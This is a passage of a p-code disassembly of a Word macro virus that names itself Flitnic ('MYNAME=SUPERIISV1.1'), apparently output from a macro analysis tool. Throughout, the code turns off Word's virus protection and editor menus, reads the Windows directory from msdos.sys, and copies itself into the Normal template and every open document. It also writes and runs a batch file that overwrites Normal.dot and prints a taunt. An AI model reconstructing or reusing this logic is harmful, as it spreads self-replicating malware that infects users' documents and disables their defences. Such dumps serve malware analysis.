' 	LitDI2 0x0021 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St a 
' 	EndIf 
' Line #137:
' 	Ld a 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo eb 
' 	EndIf 
' Line #138:
' 	Label eb 
' Line #139:
' 	LitVarSpecial (True)
' 	Ld NormalTemplate 
' 	MemSt Saved 
' Line #140:
' 	Ld wdDialogToolsMacro 
' 	Ld Application 
' 	ArgsMemLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #141:
' 	LitVarSpecial (True)
' 	St ReInf 
' Line #142:
' 	Ld Application 
' 	MemLd ShowVisualBasicEditor 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (False)
' 	St ReInf 
' 	EndIf 
' Line #143:
' 	Label Reinfection 
' Line #144:
' 	Ld ReInf 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #145:
' 	QuoteRem 0x0000 0x000C "Reinfection:"
' Line #146:
' 	LitDI2 0x0000 
' 	St Acd 
' Line #147:
' 	LitDI2 0x0000 
' 	St NormT 
' Line #148:
' 	Ld NormT 
' 	LitDI2 0x0001 
' 	Ne 
' 	IfBlock 
' Line #149:
' 	Ld NormalTemplate 
' 	ArgsMemCall OpenAsDocument 0x0000 
' Line #150:
' 	Ld ActiveDocument 
' 	MemLd ReadOnly 
' 	St NormAt 
' Line #151:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #152:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #153:
' 	Label look 
' Line #154:
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St ms 
' Line #155:
' 	StartForVariable 
' 	Ld inn 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	Ld ms 
' 	For 
' Line #156:
' 	Ld inn 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St a 
' Line #157:
' 	Ld a 
' 	LitDI2 0x0001 
' 	Lt 
' 	IfBlock 
' Line #158:
' 	Ld FullCodeN 
' 	Paren 
' 	Ld inn 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromstring 0x0001 
' Line #159:
' 	LitDI2 0x0014 
' 	St i 
' Line #160:
' 	ExitFor 
' Line #161:
' 	EndIfBlock 
' Line #162:
' 	StartForVariable 
' 	Ld inn 
' 	EndForVariable 
' 	NextVar 
' Line #163:
' 	Ld i 
' 	LitDI2 0x0014 
' 	Ne 
' 	IfBlock 
' Line #164:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #165:
' 	Ld windir 
' 	LitStr 0x0013 "\System\Flitnic.drv"
' 	Concat 
' 	ArgsLd Dir 0x0001 
' 	St a 
' Line #166:
' 	Ld a 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld windir 
' 	LitStr 0x0013 "\system\Flitnic.drv"
' 	Concat 
' 	ArgsCall Kill 0x0001 
' 	EndIf 
' Line #167:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #168:
' 	Ld windir 
' 	LitStr 0x0013 "\System\Flitnic.drv"
' 	Concat 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #169:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "Attribute VB_Name = "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0006 "Modul1"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	PrintItemNL 
' Line #170:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #171:
' 	Ld windir 
' 	LitStr 0x0013 "\System\Flitnic.drv"
' 	Concat 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #172:
' 	GoTo look 
' Line #173:
' 	EndIfBlock 
' Line #174:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ArgsLd Dir 0x0001 
' 	St a 
' Line #175:
' 	Ld a 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo notemp 
' 	EndIf 
' Line #176:
' 	Ld NormAt 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #177:
' 	LitVarSpecial (True)
' 	Ld NormalTemplate 
' 	MemSt Saved 
' Line #178:
' 	EndIfBlock 
' Line #179:
' 	EndIfBlock 
' Line #180:
' 	LitDI2 0x0001 
' 	St i 
' Line #181:
' 	Ld NormAt 
' 	LitVarSpecial (True)
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #182:
' 	Label notemp 
' Line #183:
' 	Ld Acd 
' 	LitDI2 0x0001 
' 	Ne 
' 	IfBlock 
' Line #184:
' 	CloseAll 
' Line #185:
' 	Label look2 
' Line #186:
' 	Ld Application 
' 	MemLd Documents 
' 	MemLd Count 
' 	St a 
' Line #187:
' 	Ld a 
' 	LitDI2 0x0001 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	GoTo NoDocL 
' 	EndIf 
' Line #188:
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St ms 
' Line #189:
' 	StartForVariable 
' 	Ld inn2 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	Ld ms 
' 	For 
' Line #190:
' 	Ld inn2 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St a 
' Line #191:
' 	Ld a 
' 	LitDI2 0x0001 
' 	Lt 
' 	IfBlock 
' Line #192:
' 	Ld FullCodeD 
' 	Paren 
' 	Ld inn2 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromstring 0x0001 
' Line #193:
' 	LitDI2 0x0014 
' 	St i 
' Line #194:
' 	ExitFor 
' Line #195:
' 	EndIfBlock 
' Line #196:
' 	StartForVariable 
' 	Ld inn2 
' 	EndForVariable 
' 	NextVar 
' Line #197:
' 	Ld i 
' 	LitDI2 0x0014 
' 	Ne 
' 	IfBlock 
' Line #198:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #199:
' 	Ld windir 
' 	LitStr 0x0013 "\System\Flitnic.drv"
' 	Concat 
' 	ArgsLd Dir 0x0001 
' 	St a 
' Line #200:
' 	Ld a 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld windir 
' 	LitStr 0x0013 "\system\Flitnic.drv"
' 	Concat 
' 	ArgsCall Kill 0x0001 
' 	EndIf 
' Line #201:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #202:
' 	Ld windir 
' 	LitStr 0x0013 "\System\Flitnic.drv"
' 	Concat 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #203:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "Attribute VB_Name = "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0006 "Modul1"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	PrintItemNL 
' Line #204:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #205:
' 	Ld windir 
' 	LitStr 0x0013 "\System\Flitnic.drv"
' 	Concat 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #206:
' 	GoTo look2 
' Line #207:
' 	EndIfBlock 
' Line #208:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitDI2 0x0001 
' 	ArgsLd LBound 0x0002 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0001 "A"
' 	Ne 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 "\"
' 	Eq 
' 	And 
' 	IfBlock 
' Line #209:
' 	Ld ActiveDocument 
' 	MemLd ReadOnly 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo noactsave 
' 	EndIf 
' Line #210:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #211:
' 	Label noactsave 
' Line #212:
' 	ElseBlock 
' Line #213:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #214:
' 	EndIfBlock 
' Line #215:
' 	EndIfBlock 
' Line #216:
' 	Label NoDocL 
' Line #217:
' 	ElseBlock 
' Line #218:
' 	Ld windir 
' 	LitStr 0x000E "\System\lo.sys"
' 	Concat 
' 	LitStr 0x000C "c:\Troop.dat"
' 	ArgsCall FileCopy 0x0002 
' Line #219:
' 	Ld windir 
' 	LitStr 0x000E "\System\lo.bat"
' 	Concat 
' 	LitDI2 0x0000 
' 	ArgsLd Shell 0x0002 
' 	St a 
' Line #220:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0002 
' 	For 
' Line #221:
' 	Ld t2 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St al 
' Line #222:
' 	LitDI2 0x0001 
' 	Ld al 
' 	Ld t2 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall deletelines 0x0002 
' Line #223:
' 	LitVarSpecial (True)
' 	Ld NormalTemplate 
' 	MemSt Saved 
' Line #224:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #225:
' 	EndIfBlock 
' Line #226:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #227:
' 	LitVarSpecial (True)
' 	Ld NormalTemplate 
' 	MemSt Saved 
' Line #228:
' 	EndSub 
' Line #229:
' 	FuncDefn (Sub Flitnic())
' Line #230:
' 	Label Begin 
' Line #231:
' 	OnError eb 
' Line #232:
' 	LitVarSpecial (False)
' 	St NormAt 
' Line #233:
' 	LitVarSpecial (False)
' 	LitDI2 0x0001 
' 	LitStr 0x0004 "Edit"
' 	Ld VBE 
' 	ArgsMemLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #234:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #235:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #236:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #237:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #238:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #239:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #240:
' 	LitStr 0x000C "c:\msdos.sys"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #241:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	DoUnitil 
' Line #242:
' 	LitDI2 0x0001 
' 	Ld a 
' 	LineInput 
' Line #243:
' 	Ld a 
' 	ArgsLd UCase 0x0001 
' 	LitDI2 0x0007 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0007 "WINDIR="
' 	Eq 
' 	IfBlock 
' Line #244:
' 	Ld a 
' 	FnLen 
' 	St l 
' Line #245:
' 	Ld a 
' 	LitDI2 0x0008 
' 	Ld l 
' 	ArgsLd Mid$ 0x0003 
' 	St windir 
' Line #246:
' 	EndIfBlock 
' Line #247:
' 	Loop 
' Line #248:
' 	Ld windir 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitSub 
' 	EndIf 
' Line #249:
' 	OnError NoInf 
' Line #250:
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St ms 
' Line #251:
' 	StartForVariable 
' 	Ld t 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ms 
' 	For 
' Line #252:
' 	Ld t 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St ls 
' Line #253:
' 	Ld ls 
' 	LitDI2 0x0003 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	Ld t 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St l 
' 	EndIf 
' Line #254:
' 	Ld l 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0014 "'MYNAME=SUPERIISV1.1"
' 	Eq 
' 	IfBlock 
' Line #255:
' 	LitDI2 0x0001 
' 	St Acd 
' Line #256:
' 	ExitFor 
' Line #257:
' 	EndIfBlock 
' Line #258:
' 	StartForVariable 
' 	Ld t 
' 	EndForVariable 
' 	NextVar 
' Line #259:
' 	Ld Acd 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #260:
' 	LitStr 0x000F "Sub AutoClose()"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St FullCodeN 
' Line #261:
' 	Ld t 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St a 
' Line #262:
' 	StartForVariable 
' 	Ld ii 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	Ld a 
' 	For 
' Line #263:
' 	Ld ii 
' 	LitDI2 0x0001 
' 	Ld t 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St l 
' Line #264:
' 	Ld FullCodeN 
' 	Ld l 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St FullCodeN 
' Line #265:
' 	StartForVariable 
' 	Ld ii 
' 	EndForVariable 
' 	NextVar 
' Line #266:
' 	EndIfBlock 
' Line #267:
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St ms 
' Line #268:
' 	StartForVariable 
' 	Ld t2 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ms 
' 	For 
' Line #269:
' 	Ld t2 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St ls 
' Line #270:
' 	Ld ls 
' 	LitDI2 0x0003 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	Ld t2 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St l 
' 	EndIf 
' Line #271:
' 	Ld l 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0014 "'MYNAME=SUPERIISV1.1"
' 	Eq 
' 	IfBlock 
' Line #272:
' 	LitDI2 0x0001 
' 	St NormT 
' Line #273:
' 	ExitFor 
' Line #274:
' 	EndIfBlock 
' Line #275:
' 	StartForVariable 
' 	Ld t2 
' 	EndForVariable 
' 	NextVar 
' Line #276:
' 	Ld NormT 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #277:
' 	LitStr 0x000E "Sub AutoOpen()"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St FullCodeD 
' Line #278:
' 	Ld t2 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St a 
' Line #279:
' 	StartForVariable 
' 	Ld iiii 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	Ld a 
' 	For 
' Line #280:
' 	Ld iiii 
' 	LitDI2 0x0001 
' 	Ld t2 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St l 
' Line #281:
' 	Ld FullCodeD 
' 	Ld l 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St FullCodeD 
' Line #282:
' 	StartForVariable 
' 	Ld iiii 
' 	EndForVariable 
' 	NextVar 
' Line #283:
' 	EndIfBlock 
' Line #284:
' 	Ld NormT 
' 	LitDI2 0x0001 
' 	Ne 
' 	IfBlock 
' Line #285:
' 	Label look 
' Line #286:
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St ms 
' Line #287:
' 	StartForVariable 
' 	Ld inn 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	Ld ms 
' 	For 
' Line #288:
' 	Ld inn 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St a 
' Line #289:
' 	Ld a 
' 	LitDI2 0x0001 
' 	Lt 
' 	IfBlock 
' Line #290:
' 	Ld FullCodeN 
' 	Paren 
' 	Ld inn 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromstring 0x0001 
' Line #291:
' 	LitDI2 0x0014 
' 	St i 
' Line #292:
' 	ExitFor 
' Line #293:
' 	EndIfBlock 
' Line #294:
' 	StartForVariable 
' 	Ld inn 
' 	EndForVariable 
' 	NextVar 
' Line #295:
' 	Ld i 
' 	LitDI2 0x0014 
' 	Ne 
' 	IfBlock 
' Line #296:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #297:
' 	Ld windir 
' 	LitStr 0x0013 "\System\Flitnic.drv"
' 	Concat 
' 	ArgsLd Dir 0x0001 
' 	St a 
' Line #298:
' 	Ld a 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld windir 
' 	LitStr 0x0013 "\system\Flitnic.drv"
' 	Concat 
' 	ArgsCall Kill 0x0001 
' 	EndIf 
' Line #299:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #300:
' 	Ld windir 
' 	LitStr 0x0013 "\System\Flitnic.drv"
' 	Concat 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #301:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "Attribute VB_Name = "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0006 "Modul1"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	PrintItemNL 
' Line #302:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #303:
' 	Ld windir 
' 	LitStr 0x0013 "\System\Flitnic.drv"
' 	Concat 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #304:
' 	GoTo look 
' Line #305:
' 	EndIfBlock 
' Line #306:
' 	Ld windir 
' 	LitStr 0x000E "\System\lo.sys"
' 	Concat 
' 	ArgsLd Dir 0x0001 
' 	St a 
' Line #307:
' 	Ld a 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld windir 
' 	LitStr 0x000E "\System\lo.sys"
' 	Concat 
' 	ArgsCall Kill 0x0001 
' 	EndIf 
' Line #308:
' 	Ld NormalTemplate 
' 	ArgsMemCall OpenAsDocument 0x0000 
' Line #309:
' 	Ld ActiveDocument 
' 	MemLd ReadOnly 
' 	St NormAtt 
' Line #310:
' 	LitStr 0x0000 ""
' 	St l 
' Line #311:
' 	OnError eb 
' Line #312:
' 	Ld windir 
' 	LitStr 0x000E "\System\lo.sys"
' 	Concat 
' 	ParamNamed FileName 
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnlyRecommended 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0004 
' Line #313:
' 	LitVarSpecial (True)
' 	Ld NormalTemplate 
' 	MemSt Saved 
' Line #314:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #315:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #316:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #317:
' 	Ld windir 
' 	LitStr 0x000E "\System\lo.bat"
' 	Concat 
' 	ArgsLd Dir 0x0001 
' 	St a 
' Line #318:
' 	Ld a 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld windir 
' 	LitStr 0x000E "\System\lo.bat"
' 	Concat 
' 	ArgsCall Kill 0x0001 
' 	EndIf 
' Line #319:
' 	CloseAll 
' Line #320:
' 	Ld windir 
' 	LitStr 0x000E "\System\lo.bat"
' 	Concat 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #321:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 ":Begin"
' 	PrintItemNL 
' Line #322:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	FnLen 
' 	St l 
' Line #323:
' 	Ld l 
' 	LitDI2 0x000A 
' 	Sub 
' 	St l 
' Line #324:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x01F4 
' 	For 
' Line #325:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0025 "rem Flitnic has catched you... he, he"
' 	PrintItemNL 
' Line #326:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #327:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 ":Begin"
' 	PrintItemNL 
' Line #328:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0015 "Move /y c:\Troop.dat "
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	Concat 
' 	PrintItemNL 
' Line #329:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0020 "If exist c:\Troop.dat goto Begin"
' 	PrintItemNL 
' Line #330:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #331:
' 	LitVarSpecial (True)
' 	Ld NormalTemplate 
' 	MemSt Saved 
' Line #332:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ArgsLd Dir 0x0001 
' 	St a 
' Line #333:
' 	Ld a 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo notemp 
' 	EndIf 
' Line #334:
' 	Ld NormAt 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #335:
' 	EndIfBlock 
' Line #336:
' 	Label notemp 
' Line #337:
' 	EndIfBlock 
' Line #338:
' 	LitDI2 0x0001 
' 	St i 
' Line #339:
' 	Ld Acd 
' 	LitDI2 0x0001 
' 	Ne 
' 	IfBlock 
' Line #340:
' 	CloseAll 
' Line #341:
' 	Label look2 
' Line #342:
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St ms 
' Line #343:
' 	StartForVariable 
' 	Ld inn2 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	Ld ms 
' 	For 
' Line #344:
' 	Ld inn2 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St a 
' Line #345:
' 	Ld a 
' 	LitDI2 0x0001 
' 	Lt 
' 	IfBlock 
' Line #346:
' 	Ld FullCodeD 
' 	Paren 
' 	Ld inn2 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromstring 0x0001 
' Line #347:
' 	LitDI2 0x0014 
' 	St i 
' Line #348:
' 	ExitFor 
' Line #349:
' 	EndIfBlock 
' Line #350:
' 	StartForVariable 
' 	Ld inn2 
' 	EndForVariable 
' 	NextVar 
' Line #351:
' 	Ld i 
' 	LitDI2 0x0014 
' 	Ne 
' 	IfBlock 
' Line #352:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #353:
' 	Ld windir 
' 	LitStr 0x0013 "\System\Flitnic.drv"
' 	Concat 
' 	ArgsLd Dir 0x0001 
' 	St a 
' Line #354:
' 	Ld a 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld windir 
' 	LitStr 0x0013 "\system\Flitnic.drv"
' 	Concat 
' 	ArgsCall Kill 0x0001 
' 	EndIf 
' Line #355:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #356:
' 	Ld windir 
' 	LitStr 0x0013 "\System\Flitnic.drv"
' 	Concat 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #357:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "Attribute VB_Name = "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0006 "Modul1"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	PrintItemNL 
' Line #358:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #359:
' 	Ld windir 
' 	LitStr 0x0013 "\System\Flitnic.drv"
' 	Concat 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #360:
' 	GoTo look2 
' Line #361:
' 	EndIfBlock 
' Line #362:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitDI2 0x0001 
' 	ArgsLd LBound 0x0002 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0001 "A"
' 	Ne 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 "\"
' 	Eq 
' 	And 
' 	IfBlock 
' Line #363:
' 	Ld ActiveDocument 
' 	MemLd ReadOnly 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo noactsave 
' 	EndIf 
' Line #364:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #365:
' 	Label noactsave 
' Line #366:
' 	ElseBlock 
' Line #367:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #368:
' 	EndIfBlock 
' Line #369:
' 	EndIfBlock 
' Line #370:
' 	Label NoInf 
' Line #371:
' 	Label eb 
' Line #372:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ArgsLd Dir 0x0001 
' 	St a 
' Line #373:
' 	Ld a 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #374:
' 	LitVarSpecial (False)
' 	Ld NormalTemplate 
' 	MemSt Saved 
' Line #375:
' 	GoTo NoNormal 
' Line #376:
' 	EndIfBlock 
' Line #377:
' 	Ld NormAtt 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #378:
' 	Ld windir 
' 	LitStr 0x000E "\System\lo.sys"
' 	Concat 
' 	LitStr 0x000C "c:\Troop.dat"
' 	ArgsCall FileCopy 0x0002 
' Line #379:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	Paren 
' 	Ld vbNormal 
' 	ArgsCall SetAttr 0x0002 
' Line #380:
' 	Ld windir 
' 	LitStr 0x000E "\System\lo.bat"
' 	Concat 
' 	LitDI2 0x0000 
' 	ArgsLd Shell 0x0002 
' 	St a 
' Line #381:
' 	ElseBlock 
